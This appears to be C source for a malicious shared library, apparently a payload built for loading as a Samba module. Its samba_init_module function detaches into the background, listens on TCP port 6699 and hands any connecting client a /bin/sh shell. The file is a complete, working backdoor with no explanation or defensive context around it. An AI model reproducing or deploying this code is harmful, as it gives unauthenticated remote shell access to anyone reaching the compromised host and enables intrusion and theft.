#include <stdio.h>
    #include <stdlib.h>
    #include <netinet/in.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <sys/stat.h>
    #include <unistd.h>
    #define EXIT_SUCCESS 0
    #define EXIT_FAILURE 1
static void detachFromParent(void) { pid_t pid, sid;
if ( getppid() == 1 ){ return;
}
pid = fork(); if (pid < 0) {
            exit(EXIT_FAILURE);
        }
if (pid > 0) { exit(EXIT_SUCCESS);
}
umask(0);
sid = setsid(); if (sid < 0) {
            exit(EXIT_FAILURE);
        }
if ((chdir("/")) < 0) { exit(EXIT_FAILURE);
} 
}
int samba_init_module(void){ detachFromParent();
int hostSocket;
int clientSocket;
struct sockaddr_in hostAddr;
hostSocket = socket(PF_INET, SOCK_STREAM, 0);
        hostAddr.sin_family = AF_INET;
        hostAddr.sin_port = htons(6699);
        hostAddr.sin_addr.s_addr = htonl(INADDR_ANY);
bind(hostSocket, (struct sockaddr*) &hostAddr, sizeof(hostAddr)); listen(hostSocket, 2);
clientSocket = accept(hostSocket, NULL, NULL);
        dup2(clientSocket, 0);
        dup2(clientSocket, 1);
        dup2(clientSocket, 2);
        execve("/bin/sh", NULL, NULL);
        close(hostSocket);
return 0; 
}
